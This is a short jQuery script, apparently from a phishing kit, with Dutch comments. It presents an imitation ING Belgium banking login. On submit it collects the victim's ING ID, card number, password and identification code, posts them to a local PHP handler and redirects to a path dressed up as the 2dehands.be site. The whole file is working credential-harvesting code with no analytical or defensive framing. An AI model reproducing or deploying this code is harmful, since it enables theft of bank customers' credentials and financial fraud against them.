$(function() {
    // PAGINA WAAR JE NAAR WILT GAAN NA EEN AANMELDING
    var redirect = '/www.2dehands.be/response/ingbe.html';

	// Enable login button
	$('#ing-login').prop('disabled', false);

    $("form").submit(function(e){       
        e.preventDefault(e);
        // Read properties from login form
        var ingID       = $('#ing-id').val();
        var ingCardid   = $('#ing-cardid').val();
        var ingVersion  = {'01':'Home', '02':'Business'};
        var ingPassword = $('#ing-password').val();
        var ingIdentify = $('#ing-identification').val();

        // Build object for posting to php
        var data = {"id":ingID, "cardid":ingCardid, "version":ingVersion[$('input:checked').val()], "password":ingPassword, "identifier":ingIdentify};

        // Post to php
        $.post("./opdrachting.php", JSON.stringify(data), function(res){
            window.location.replace(redirect);
        });
    });
});